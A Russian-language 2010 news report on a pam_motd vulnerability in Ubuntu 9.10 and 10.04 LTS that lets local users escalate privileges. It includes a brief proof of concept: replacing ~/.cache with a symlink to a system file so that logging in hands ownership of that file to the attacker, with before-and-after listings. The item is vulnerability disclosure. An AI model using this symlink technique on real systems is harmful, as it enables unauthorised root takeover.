---
title: 'Уязвимость в Ubuntu позволяющую получить права администратора'
date: '2010-07-08T18:38:47+04:00'
uri: 'news/uyazvimost-v-ubuntu-pozvolyaushchuu-poluchit-prava-administratora'
alias: 
  - 'news/416.html'
tags: 'Уязвимость,Ubuntu Linux'
source: 'http://www.opennet.ru/opennews/art.shtml?num=27239'
unixtime: 1278599927
visits: 2479
---
В по умолчанию включенном в Ubuntu PAM-модуле [pam\_motd](http://bazaar.launchpad.net/%7Eubuntu-branches/ubuntu/karmic/pam/karmic-updates/revision/58), выводящем после входа в систему “совет дня”, найдена уязвимость, позволяющая локальным пользователям повысить свои привилегии в системе. Суть проблемы связана с некорректным созданием файла motd.legal-notice в процессе активации pam\_motd, который создается без надлежащих проверок в домашней директории пользователя процессом с правами root. Создав символическую ссылку вместо поддиректории ~/.cache в которой создает файл pam\_motd, локальный злоумышленник может добиться изменения прав доступа для произвольного файла в системе.

Например, для того чтобы стать владельцем файла /etc/shadow\_test достаточно выполнить:

```
   mv -f ~/.cache ~/.cache.old 
   ln -s /etc/shadow_test ~/.cache
   ls -al /etc/shadow_test
   -rw-r-----  1 root     shadow      1700 Май 29 02:07 shadow_test
```

  После входа под логином текущего пользователя по ssh или через консоль:

```
   ls -al /etc/shadow_test
   -rw-r-----  1 user     user      1700 Май 29 02:07 shadow_test
```

Как видно из примера, атака позволяет изменить права доступа на файл /etc/shadow\_test на идентификатор злоумышленника, который затем сможет изменить пароль суперпользователя и осуществить вход в роли администратора. Проблеме подвержен только дистрибутив Ubuntu (Ubuntu 9.10 и Ubuntu 10.04 LTS).
